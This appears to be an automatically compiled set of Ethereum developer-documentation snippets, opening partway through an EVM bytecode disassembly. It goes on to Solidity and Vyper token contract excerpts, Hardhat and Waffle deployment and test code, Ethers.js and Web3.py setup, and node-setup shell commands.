0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x60 PUSH1 0x3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x57C JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x551 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x57C JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x55F JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x59A PUSH2 0x593 PUSH2 0x9AD JUMP JUMPDEST DUP5 DUP5 PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x2 SLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x5BB DUP5 DUP5 DUP5 PUSH2 0xBAC JUMP JUMPDEST PUSH2 0x67C DUP5 PUSH2 0x5C7 PUSH2 0x9AD JUMP JUMPDEST PUSH2 0x677 DUP6 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x28 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1026 PUSH1 0x28 SWAP2 CODECOPY PUSH1 0x1 PUSH1 0x0 DUP12 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x62D PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x5 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x747 PUSH2 0x6AB PUSH2 0x9AD JUMP JUMPDEST DUP5 PUSH2 0x742 DUP6 PUSH1 0x1 PUSH1 0x0 PUSH2 0x6BC PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP10 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xF2D SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x60 PUSH1 0x4 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x831 JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x806 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x831 JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 ADD SWAP1 PUSH1 0x20 ADD DUP1 DUP4 GT PUSH2 0x814 JUMPI DUP3 SWAP1 SUB PUSH1 0x1F AND DUP3 ADD SWAP2 JUMPDEST POP POP POP POP POP SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH2 0x8FE PUSH2 0x848 PUSH2 0x9AD JUMP JUMPDEST DUP5 PUSH2 0x8F9 DUP6 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x25 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1097 PUSH1 0x25 SWAP2 CODECOPY PUSH1 0x1 PUSH1 0x0 PUSH2 0x872 PUSH2 0x9AD JUMP JUMPDEST PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP11 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH2 0x9B5 JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x91C PUSH2 0x915 PUSH2 0x9AD JUMP JUMPDEST DUP5 DUP5 PUSH2 0xBAC JUMP JUMPDEST PUSH1 0x1 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 CALLER SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xA3B JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x24 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x1073 PUSH1 0x24 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xAC1 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x22 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xFDE PUSH1 0x22 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 PUSH1 0x1 PUSH1 0x0 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8C5BE1E5EBEC7D5BD14F71427D1E84F3DD0314C0F7B2291E5B200AC8C7C3B925 DUP4 PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xC32 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x25 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x104E PUSH1 0x25 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0xCB8 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x23 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0xFBB PUSH1 0x23 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH2 0xCC3 DUP4 DUP4 DUP4 PUSH2 0xFB5 JUMP JUMPDEST PUSH2 0xD2E DUP2 PUSH1 0x40 MLOAD DUP1 PUSH1 0x60 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x26 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1000 PUSH1 0x26 SWAP2 CODECOPY PUSH1 0x0 DUP1 DUP8 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD PUSH2 0xE6D SWAP1 SWAP3 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST PUSH1 0x0 DUP1 DUP6 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2\n```\n\n----------------------------------------\n\nTITLE: Implementing Cache Write Function with Duplicate Prevention\nDESCRIPTION: Function for adding values to the cache that checks for existing entries to prevent duplicates, returning the key for the stored value.\n\nLANGUAGE: solidity\nCODE:\n```\n    // Write a value to the cache if it's not there already\n    // Only public to enable the test to work\n    function cacheWrite(uint _value) public returns (uint) {\n        // If the value is already in the cache, return the current key\n        if (val2key[_value] != 0) {\n            return val2key[_value];\n        }\n```\n\n----------------------------------------\n\nTITLE: Running Hardhat Deployment Script on Goerli Network\nDESCRIPTION: Command to deploy the Hello World smart contract to the Goerli testnet using Hardhat.\n\nLANGUAGE: bash\nCODE:\n```\nnpx hardhat run scripts/deploy.js --network goerli\n```\n\n----------------------------------------\n\nTITLE: Deployment Success Output\nDESCRIPTION: The expected console output after successfully deploying the contract, showing the contract address on the Goerli network.\n\nLANGUAGE: bash\nCODE:\n```\nContract deployed to address: 0x6cd7d44516a20882cEa2DE9f205bF401c0d23570\n```\n\n----------------------------------------\n\nTITLE: Creating Contract Instance with Ethers.js\nDESCRIPTION: Code that initializes a provider, signer, and contract instance using Ethers.js to interact with the deployed smart contract.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\n\n// Provider\nconst alchemyProvider = new ethers.providers.AlchemyProvider(\n  (network = \"goerli\"),\n  API_KEY\n)\n\n// Signer\nconst signer = new ethers.Wallet(PRIVATE_KEY, alchemyProvider)\n\n// Contract\nconst helloWorldContract = new ethers.Contract(\n  CONTRACT_ADDRESS,\n  contract.abi,\n  signer\n)\n```\n\n----------------------------------------\n\nTITLE: Implementing Balance Synchronization Functions in Uniswap V2 Pair Contract in Solidity\nDESCRIPTION: These functions help maintain balance consistency between actual token balances and reserves in the Uniswap V2 pair contract. 'skim' extracts excess tokens that were directly transferred to the contract, while 'sync' updates the reserves to match current balances.\n\nLANGUAGE: solidity\nCODE:\n```\n    // force balances to match reserves\n    function skim(address to) external lock {\n        address _token0 = token0; // gas savings\n        address _token1 = token1; // gas savings\n        _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));\n        _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));\n    }\n\n\n\n    // force reserves to match balances\n    function sync() external lock {\n        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Flashing the Ethereum on Arm Image to MicroSD Card\nDESCRIPTION: Shell commands to unzip and flash the Ethereum on Arm image to the MicroSD card. The dd command writes the image directly to the device, completely overwriting its contents.\n\nLANGUAGE: shell\nCODE:\n```\n# unzip and flash image\nunzip ethonarm_22.04.00.img.zip\nsudo dd bs=1M if=ethonarm_22.04.00.img of=/dev/<sdxx> conv=fdatasync status=progress\n```\n\n----------------------------------------\n\nTITLE: Creating Card Container with Emoji Cards in React/JSX\nDESCRIPTION: A component structure for displaying three emoji-based feature cards highlighting the benefits of participating in the ethereum.org Translatathon.\n\nLANGUAGE: jsx\nCODE:\n```\n<CardContainer>\n  <EmojiCard\n    emoji=':globe_with_meridians:'\n    title='Translate ethereum.org'\n    description='Translate ethereum.org content into your language so that more people can learn about Ethereum'\n  />\n  <EmojiCard\n    emoji=':trophy:'\n    title='Win prizes'\n    description='Compete for your share of 30,000$ in prizes and a chance to get Devcon tickets'\n  />\n  <EmojiCard\n    emoji=':bulb:'\n    title='Learn about Ethereum'\n    description='Learn more about Ethereum while translating and competing'\n  />\n</CardContainer>\n```\n\n----------------------------------------\n\nTITLE: Switching Consensus Layer Clients\nDESCRIPTION: Commands for stopping the Prysm beacon client and enabling Lighthouse as an alternative consensus layer client.\n\nLANGUAGE: bash\nCODE:\n```\nsudo systemctl stop prysm-beacon && sudo systemctl disable prysm-beacon\nsudo systemctl start lighthouse && sudo systemctl enable lighthouse\n```\n\n----------------------------------------\n\nTITLE: Implementing a Simple Name Registration System in Ethereum\nDESCRIPTION: A basic Ethereum smart contract for a Namecoin-like name registration system where users can register names with associated values. The contract only allows names to be registered if they haven't been claimed before, creating a permanent record.\n\nLANGUAGE: python\nCODE:\n```\ndef register(name, value):\n  if !self.storage[name]:\n    self.storage[name] = value\n```\n\n----------------------------------------\n\nTITLE: Setting Up TypeScript Test Environment for Waffle\nDESCRIPTION: Initial test setup code that imports dependencies, sets up the MockProvider, and prepares the contract for testing.\n\nLANGUAGE: typescript\nCODE:\n```\nimport { expect, use } from \"chai\"\nimport { Contract } from \"ethers\"\nimport { deployContract, MockProvider, solidity } from \"ethereum-waffle\"\nimport EtherSplitter from \"../build/EtherSplitter.json\"\n\nuse(solidity)\n\ndescribe(\"Ether Splitter\", () => {\n  const [sender, receiver1, receiver2] = new MockProvider().getWallets()\n  let splitter: Contract\n\n  beforeEach(async () => {\n    splitter = await deployContract(sender, EtherSplitter, [\n      receiver1.address,\n      receiver2.address,\n    ])\n  })\n\n  // add the tests here\n})\n```\n\n----------------------------------------\n\nTITLE: Setting Up TypeScript Test Environment for Waffle\nDESCRIPTION: Initial test setup code that imports dependencies, sets up the MockProvider, and prepares the contract for testing.\n\nLANGUAGE: typescript\nCODE:\n```\nimport { expect, use } from \"chai\"\nimport { Contract } from \"ethers\"\nimport { deployContract, MockProvider, solidity } from \"ethereum-waffle\"\nimport EtherSplitter from \"../build/EtherSplitter.json\"\n\nuse(solidity)\n\ndescribe(\"Ether Splitter\", () => {\n  const [sender, receiver1, receiver2] = new MockProvider().getWallets()\n  let splitter: Contract\n\n  beforeEach(async () => {\n    splitter = await deployContract(sender, EtherSplitter, [\n      receiver1.address,\n      receiver2.address,\n    ])\n  })\n\n  // add the tests here\n})\n```\n\n----------------------------------------\n\nTITLE: OR Opcode (Bitwise) in EVM\nDESCRIPTION: The OR opcode performs a bitwise OR operation. It takes two values from the stack and returns the result of applying a bitwise OR to them.\n\nLANGUAGE: evm-assembly\nCODE:\n```\na || b\n```\n\n----------------------------------------\n\nTITLE: Sending Transaction with Custom Calldata in JavaScript\nDESCRIPTION: JavaScript code that shows how to send a transaction with custom calldata when the standard contract call method can't be used due to non-standard ABI implementation.\n\nLANGUAGE: javascript\nCODE:\n```\nconst tx = await worm.populateTransaction.writeEntryCached()\ntx.data = calldata\n\nsentTx = await wallet.sendTransaction(tx)\n```\n\n----------------------------------------\n\nTITLE: Testing Encoding of Multi-byte Cache Keys in Solidity\nDESCRIPTION: Test function that verifies the handling of larger cache keys that require multiple bytes to encode, ensuring that values beyond the single-byte range work correctly.\n\nLANGUAGE: solidity\nCODE:\n```\n    // Test encodeVal when the key is more than a single byte\n    // Maximum three bytes because filling the cache to four bytes takes\n    // too long.\n    function testEncodeValBig() public {\n        // Put a number of values in the cache.\n        // To keep things simple, use key n for value n.\n        for(uint i=1; i<0x1FFF; i++) {\n            cache.cacheWrite(i);\n        }\n        .\n        .\n        .\n\n        _callInput = bytes.concat(\n            FOUR_PARAMS,\n            cache.encodeVal(0x000F),   // One byte        0x0F\n            cache.encodeVal(0x0010),   // Two bytes     0x1010\n            cache.encodeVal(0x0100),   // Two bytes     0x1100\n            cache.encodeVal(0x1000)    // Three bytes 0x201000\n        );\n\n```\n\n----------------------------------------\n\nTITLE: Installing Required Dependencies for the JavaScript Client\nDESCRIPTION: Commands to navigate to the JavaScript directory and install the required dependencies using Yarn.\n\nLANGUAGE: shell\nCODE:\n```\ncd javascript\nyarn\n```\n\n----------------------------------------\n\nTITLE: Retrieving Ethereum Balance using JSON-RPC\nDESCRIPTION: A sample JSON-RPC response showing the balance of an Ethereum account on the Goerli testnet. The balance is returned in wei, the smallest denomination of ether.\n\nLANGUAGE: json\nCODE:\n```\n{ \"jsonrpc\": \"2.0\", \"id\": 0, \"result\": \"0x2B5E3AF16B1880000\" }\n```\n\n----------------------------------------\n\nTITLE: Handling HTML Tags in Translation Strings\nDESCRIPTION: Example showing how to handle HTML tags in translation strings, where translators should translate the text content but preserve the tags themselves.\n\nLANGUAGE: html\nCODE:\n```\n<0>...</0>\n```\n\n----------------------------------------\n\nTITLE: Calculating Swap Outputs and Executing Swaps in Uniswap V2\nDESCRIPTION: This code calculates the appropriate output amounts for a token swap and executes the swap operation. It determines which token receives the output amount based on the token ordering in the pair.\n\nLANGUAGE: solidity\nCODE:\n```\n(uint amount0Out, uint amount1Out) = input == token0 ? (uint(0), amountOutput) : (amountOutput, uint(0));\naddress to = i < path.length - 2 ? UniswapV2Library.pairFor(factory, output, path[i + 2]) : _to;\npair.swap(amount0Out, amount1Out, to, new bytes(0));\n```\n\n----------------------------------------\n\nTITLE: Typed Transaction Envelope format in Ethereum\nDESCRIPTION: The general format for typed transactions in Ethereum as defined by EIP-2718, consisting of a transaction type identifier followed by the transaction payload.\n\nLANGUAGE: plaintext\nCODE:\n```\nTransactionType || TransactionPayload\n```\n\n----------------------------------------\n\nTITLE: Importing ERC20 Interface\nDESCRIPTION: Imports the standard OpenZeppelin ERC20 interface to interact with ERC20 tokens on L1.\n\nLANGUAGE: solidity\nCODE:\n```\nimport { IERC20 } from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n```\n\n----------------------------------------\n\nTITLE: Cache Contract Import for Testing\nDESCRIPTION: Imports the Cache contract that will be tested. This statement allows the test file to access and interact with the contract under test.\n\nLANGUAGE: solidity\nCODE:\n```\nimport \"src/Cache.sol\";\n```\n\n----------------------------------------\n\nTITLE: Running Echidna with Gas Estimation Configuration in Bash\nDESCRIPTION: Demonstrates how to run the Echidna tool to test a Solidity contract with gas estimation enabled through a configuration file. The output shows the maximum gas used by a function along with the call sequence that produced it.\n\nLANGUAGE: bash\nCODE:\n```\nechidna-test gas.sol --config config.yaml\n...\nechidna_test: passed! 🎉\n\nf used a maximum of 1333608 gas\n  Call sequence:\n    f(42,123,249) Gas price: 0x10d5733f0a Time delay: 0x495e5 Block delay: 0x88b2\n\nUnique instructions: 157\nUnique codehashes: 1\nSeed: -325611019680165325\n\n```\n\n----------------------------------------\n\nTITLE: Eth2 Definition in Ethereum Terminology\nDESCRIPTION: Definition of 'Eth2' term which previously referred to Ethereum's proof-of-stake upgrades, now deprecated in favor of 'consensus layer'.\n\nLANGUAGE: markdown\nCODE:\n```\n'Eth2' is a term that referred to a set of Ethereum protocol upgrades, including Ethereum's transition to proof-of-stake. This term has since been deprecated in favor of the 'consensus layer'. [Learn more about this name change](https://blog.ethereum.org/2022/01/24/the-great-eth2-renaming/).\n```\n\n----------------------------------------\n\nTITLE: Displaying GitHub Issues with IssuesList Component in React\nDESCRIPTION: This code uses a custom React component called IssuesList to display GitHub issues labeled as good first issues for new contributors, with specific styling parameters.\n\nLANGUAGE: jsx\nCODE:\n```\n<IssuesList issues={gfissues} my={8} />\n```\n\n----------------------------------------\n\nTITLE: Button Link to ETH Information\nDESCRIPTION: A standalone button component that links to more information about Ethereum's native currency, ETH.\n\nLANGUAGE: jsx\nCODE:\n```\n<ButtonLink href=\"/eth/\">\n  More on ETH\n</ButtonLink>\n```\n\n----------------------------------------\n\nTITLE: Compilation des contrats avec Waffle\nDESCRIPTION: Commande pour compiler les contrats Solidity en utilisant les configurations définies dans waffle.json.\n\nLANGUAGE: bash\nCODE:\n```\nnpx waffle\n```\n\n----------------------------------------\n\nTITLE: Testing Event Emission with Waffle's emit Matcher\nDESCRIPTION: Tests that verify if the contract emits Transfer events with correct parameters when wei is transferred to each receiver.\n\nLANGUAGE: typescript\nCODE:\n```\nit(\"Emits event on the transfer to the first receiver\", async () => {\n  await expect(splitter.split({ value: 50 }))\n    .to.emit(splitter, \"Transfer\")\n    .withArgs(sender.address, receiver1.address, 25)\n})\n\nit(\"Emits event on the transfer to the second receiver\", async () => {\n  await expect(splitter.split({ value: 50 }))\n    .to.emit(splitter, \"Transfer\")\n    .withArgs(sender.address, receiver2.address, 25)\n})\n```\n\n----------------------------------------\n\nTITLE: Defining ERC-20 Events in Interface\nDESCRIPTION: Declares the Transfer and Approval events that ERC-20 tokens must emit when state changes occur. These events allow external applications to track token movements and allowance changes on the blockchain.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `Valor` é a nova permissão.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Token Approval and Emitting Event in ERC-721 Contract\nDESCRIPTION: This code sets the approval for a specific token and emits the Approval event to notify listeners of the change in approval status.\n\nLANGUAGE: vyper\nCODE:\n```\n    # Set the approval\n    self.idToApprovals[_tokenId] = _approved\n    log Approval(owner, _approved, _tokenId)\n```\n\n----------------------------------------\n\nTITLE: Authorization Check for approve Function in ERC-721 Contract\nDESCRIPTION: This code verifies that the caller is either the token owner or an approved operator for the owner, ensuring only authorized parties can set token approvals.\n\nLANGUAGE: vyper\nCODE:\n```\n    # Check requirements\n    senderIsOwner: bool = self.idToOwner[_tokenId] == msg.sender\n    senderIsApprovedForAll: bool = (self.ownerToOperators[owner])[msg.sender]\n    assert (senderIsOwner or senderIsApprovedForAll)\n```\n\n----------------------------------------\n\nTITLE: Successful Contract Verification Output\nDESCRIPTION: Terminal output that appears when a smart contract is successfully verified on Etherscan. It provides confirmation and a link to view the verified contract on Etherscan.\n\nLANGUAGE: text\nCODE:\n```\nSuccessfully submitted source code for contract\ncontracts/HelloWorld.sol:HelloWorld at 0xdeployed-contract-address\nfor verification on Etherscan. Waiting for verification result...\n\n\nSuccessfully verified contract HelloWorld on Etherscan.\nhttps://goerli.etherscan.io/address/<contract-address>#contracts\n```\n\n----------------------------------------\n\nTITLE: ERC20WithdrawalFinalized Event for L2 to L1 Transfers\nDESCRIPTION: Defines the event emitted when a withdrawal (transfer from L2 to L1) is finalized. This event has the same structure as the deposit event but is triggered during the withdrawal finalization process.\n\nLANGUAGE: solidity\nCODE:\n```\n    event ERC20WithdrawalFinalized(\n        address indexed _l1Token,\n        address indexed _l2Token,\n        address indexed _from,\n        address _to,\n        uint256 _amount,\n        bytes _data\n    );\n```\n\n----------------------------------------\n\nTITLE: Querying ERC-721 Tokens Using Web3.py\nDESCRIPTION: A Python example demonstrating how to interact with an ERC-721 token contract (CryptoKitties) using Web3.py. This code queries basic information like token name, symbol, and balance.\n\nLANGUAGE: python\nCODE:\n```\nfrom web3 import Web3\nfrom web3._utils.events import get_event_data\n\n\nw3 = 